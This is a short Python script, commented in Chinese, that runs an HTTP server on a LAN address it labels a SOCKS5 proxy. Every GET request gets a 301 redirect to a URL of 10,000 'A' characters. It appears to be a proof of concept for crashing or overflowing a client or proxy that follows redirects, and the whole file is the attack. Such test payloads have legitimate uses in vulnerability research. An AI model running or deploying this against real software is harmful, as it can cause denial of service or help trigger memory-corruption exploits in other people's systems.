from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 301重定向到超长的URL
        self.send_response(301)
        new_url = 'http://' + 'A' * 10000
        self.send_header('Location', new_url)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=RequestHandler):
    server_address = ('192.168.1.1', 8000)                             # socks5代理服务器ip
    httpd = server_class(server_address, handler_class)
    print('Starting httpd...')
    httpd.serve_forever()

run()